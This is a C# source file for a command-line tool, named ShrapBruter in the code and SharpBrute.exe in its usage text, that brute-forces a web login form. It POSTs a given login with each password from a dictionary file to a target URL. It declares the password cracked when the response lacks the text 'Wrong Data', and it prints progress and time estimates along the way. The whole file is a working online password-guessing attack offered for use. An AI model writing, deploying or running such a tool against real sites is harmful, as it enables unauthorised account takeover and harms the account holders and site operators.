using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Linq;
using System.Net.Http;

// Author: MattTheCoder-W

namespace ShrapBruter
{
    class Globals{
        public static bool cracked = false;
    }

    class Program
    {
        static void Message(String text, String end = "\n", String type = "info"){
            String prefix = "";
            switch(type){
                case "info":
                    prefix = ">>>";
                break;
                case "error":
                    prefix = "!!!";
                break;
                default:
                    prefix = ">>>";
                break;
            }
            Console.Write($"{prefix} {text}" + end);
        }

        private static readonly HttpClient client = new HttpClient();

        static async Task SharePost(string login, string pass, string[] headers, string address, bool verbose = false)
        {
            var values = new Dictionary<string, string>
            {
                {headers[0], login},
                {headers[1], pass}
            };

            var content = new FormUrlEncodedContent(values);
            var response = await client.PostAsync(address, content);
            string responseString = response.Content.ReadAsStringAsync().Result;

            if(verbose){ 
                Console.WriteLine(responseString);
                Console.WriteLine($"{headers[0]}: {login}, {headers[1]}: {pass}");
            }

            if(!responseString.Contains("Wrong Data")){
                Globals.cracked = true;
            }
        }

        static Object[] Arguments(string[] args){

            string[] KNOWN = new string[] {"/u", "/l", "/p", "/v", "/headers"};
            string usage = "SharpBrute.exe /u URL /l LOGIN /p PASS_FILE [/v] [/headers HEADERS]";

            void HelpPage(){
                Console.WriteLine("Usage:\n" +
                                $"{usage}\n" +
                                "Arguments:\n" +
                                "\t/u\t\tForm URL address\n" +
                                "\t/l\t\tLogin for brute forcing.\n" +
                                "\t/p\t\tDictionary with possible passwords.\n" +
                                "\t/v\t\tVerbose mode of this program.\n" +
                                "\t/headers\tHeaders of POST requests for brute forcing.\n" +
                                "\t\t\t\tExample: --headers login,pass\n" +
                                "\t\t\t\tThis will use data headers: {login: ^LOGIN^, pass: ^PASS^}\n" +
                                "\t\t\t\tWhere ^LOGIN^ will be given login and ^PASS^ will be current pass from file.");
                Environment.Exit(0);
            }

            void UsagePage(){
                Console.WriteLine($"Usage: {usage}\n" +
                                "Use /h or /help for more help.");
                Environment.Exit(0);
            }
            
            if(args.Length > 0){
                if(args.Contains("/h") || args.Contains("/help")) HelpPage();

                String url = "", login = "", passfile = "";
                String[] headers = new String[] {"", ""};
                bool verbose = false;

                int i = 0;
                while(i < args.Length){
                    String arg = args[i];
                    if(!KNOWN.Contains(arg)) { Console.WriteLine("Unknown argumen: " + arg); Environment.Exit(0); }

                    try{
                        switch(arg){
                            case "/u":
                                url = args[i+1];
                                if(KNOWN.Contains(url)) throw new Exception();
                                if(!url.Contains("http")){
                                    Console.WriteLine($"'{url}' is not valid URL! (Don't forget about http/https)");
                                    Environment.Exit(0);
                                }
                                i += 2;
                            break;
                            case "/l":
                                login = args[i+1];
                                if(KNOWN.Contains(login)) throw new Exception();
                                i += 2;
                            break;
                            case "/p":
                                passfile = args[i+1];
                                if(KNOWN.Contains(passfile)) throw new Exception();
                                i += 2;
                            break;
                            case "/v":
                                verbose = true;
                                i++;
                            break;
                            case "/headers":
                                String subheaders = args[i+1];
                                if(KNOWN.Contains(subheaders)) throw new Exception();
                                headers = subheaders.Split(",");
                                i += 2;
                            break;
                            default:
                                Console.WriteLine("ERROR OCCURED!");
                                Environment.Exit(0);
                            break;
                        }
                    } catch(Exception){
                        // Console.WriteLine(e.Message);
                        Console.WriteLine("Please specify all values!");
                        UsagePage();
                    }
                }
                if(login == "" || passfile == "" || headers[0] == "" || headers[1] == "" || url == ""){
                    Console.WriteLine("Please specify all values!");
                    UsagePage();
                }
                // Console.WriteLine($"{login}, {passfile}, {verbose}, [{string.Join(", ", headers)}]"); 
                return new Object[] {login, passfile, verbose, headers, url};
            }
            else UsagePage();
            return new Object[] {null};
        }

        static bool CheckInteractive(string[] args, string key){
            if(args.Contains(key)){
                return true;
            }
            else{
                return false;
            }
        }

        static async Task Main(string[] args)
        {
            DateTime GetTime()
            {
                return DateTime.Now;
            }

            double[] CurrentProgress(int position, int total, DateTime startTime){
                if (position == 0)
                {
                    return new double[] {0.0f, 9999.0f}; // to avoid a divide-by-zero error
                }

                double elapsedTime = Math.Round(GetTime().Subtract(startTime).TotalSeconds, 2);
                double estimatedRemaining = Math.Round(elapsedTime * total / position, 2);
                return new double[] {elapsedTime, estimatedRemaining};
            }

            Console.WriteLine("Start");

            bool interactive = CheckInteractive(args, "/i");
            Object[] arguments;

            if(interactive){
                Interactive inter = new Interactive();
                arguments = inter.GetArguments();
            }
            else{
                arguments = Arguments(args);
            }

            String login = arguments[0].ToString();  
            String[] passes = new String[] {""};
            try{
                passes = File.ReadAllLines(arguments[1].ToString());
            } catch(System.IO.FileNotFoundException){
                Message("Given dictionary does not exist!", type: "error");
                Environment.Exit(0);
            }
            bool verbose = (bool)arguments[2];
            string[] arr = ((IEnumerable)arguments[3]).Cast<object>().Select(x => x.ToString()).ToArray();
            String[] headers = {arr[0], arr[1]};
            String url = arguments[4].ToString();

            DateTime strtTime = GetTime();
            for(int i = 0; i < passes.Length; i++){
                if(i % 1000 == 0 && verbose){ 
                    double[] elapsed = CurrentProgress(i, passes.Length, strtTime);
                    TimeSpan done = TimeSpan.FromSeconds(elapsed[0]);
                    TimeSpan remain = TimeSpan.FromSeconds(elapsed[1]);
                    Console.WriteLine($"{Math.Round((i+1.0f)/passes.Length*100.0f, 2)}%\t [ATTEMPT: {i+1}]\t Login: {login}\t Current Password: {passes[i]} [ELAPSED: {done.Hours}:{done.Minutes}:{done.Seconds}] [REMAINING: {remain.Hours}:{remain.Minutes}:{remain.Seconds}]");
                }
                await SharePost(login, passes[i], headers, url);
                if(Globals.cracked){
                    Message("Password cracked: " + passes[i]);
                    break;
                }
            }
            Message("Thanks For Using This App!");
        }
    }
}
